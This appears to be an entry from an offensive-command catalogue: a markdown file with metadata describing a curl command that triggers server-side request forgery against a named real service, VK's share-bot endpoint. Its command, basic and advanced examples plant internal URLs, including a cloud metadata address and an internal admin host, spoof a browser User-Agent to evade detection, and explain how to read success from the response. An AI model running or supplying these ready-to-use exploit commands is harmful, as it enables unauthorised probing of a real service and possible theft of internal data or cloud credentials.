---
id: c3d4e5f6-g7h8-9012-cdef-345678901234
data: >-
  curl -X POST 'https://vk.com/share-bot-endpoint' -d
  'url=http://internal.vk.com/admin' -H 'User-Agent: Mozilla/5.0 (Windows NT
  10.0; Win64; x64) AppleWebKit/537.36' --data-urlencode 'text=Test Share'
tags:
  - ssrf
  - web
type: command
output: null
executor: bash
platforms:
  - Linux
  - Windows
  - macOS
created_at: '2023-10-01T12:00:00Z'
updated_at: '2025-12-14T04:39:02.359Z'
verified: false
validated: true
submitted: true
---
# curl-trigger-share-bot

## Command

```bash
curl -X POST 'https://vk.com/share-bot-endpoint' -d 'url=http://internal.vk.com/admin' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' --data-urlencode 'text=Test Share'
```

## Description

This command uses curl to send a POST request to VK.com's Share-bots endpoint, embedding a malicious URL to trigger SSRF. It simulates a share action without flood control restrictions, allowing the server to fetch the specified internal URL.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method as POST | Yes |
| `'https://vk.com/share-bot-endpoint'` | The target Share-bots API endpoint | Yes |
| `-d 'url=...'` | The data payload with the forged SSRF URL | Yes |
| `-H 'User-Agent: ...'` | Mimics a browser to evade basic detection | No |
| `--data-urlencode 'text=...'` | Encodes additional share text parameters | No |

## Examples

### Basic Usage

```bash
curl -X POST 'https://vk.com/share-bot-endpoint' -d 'url=http://169.254.169.254/latest/meta-data/'
```

### Advanced Usage

```bash
curl -X POST 'https://vk.com/share-bot-endpoint' -d 'url=http://internal.vk.com/admin' -H 'User-Agent: Mozilla/5.0' --data-urlencode 'text=SSRF Test' -v
```

## Expected Output

A successful response might be a JSON object like {"success": true}, but look for verbose (-v) output showing server-side processing, such as connection details or leaked internal errors. No rate-limit rejection indicates exploitation success.

## Related

- [[Related Procedure: Exploit-SSRF-in-VK-Share-Bots]]
